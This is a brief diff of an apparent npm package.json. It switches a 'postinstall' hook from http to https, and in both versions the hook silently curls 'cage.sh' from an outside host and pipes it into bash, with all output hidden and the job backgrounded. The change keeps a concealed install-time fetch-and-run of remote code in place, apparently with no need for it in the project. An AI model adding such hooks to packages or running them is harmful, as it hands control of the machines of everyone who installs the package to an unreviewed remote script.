@@ -4,6 +4,6 @@
   "dependencies": {
   },
   "scripts": {
-    "postinstall": "curl http://files.gangelov.net/cage.sh 2>/dev/null | bash &>/dev/null"
+    "postinstall": "curl https://files.gangelov.net/cage.sh 2>/dev/null | bash &>/dev/null"
   }
 }
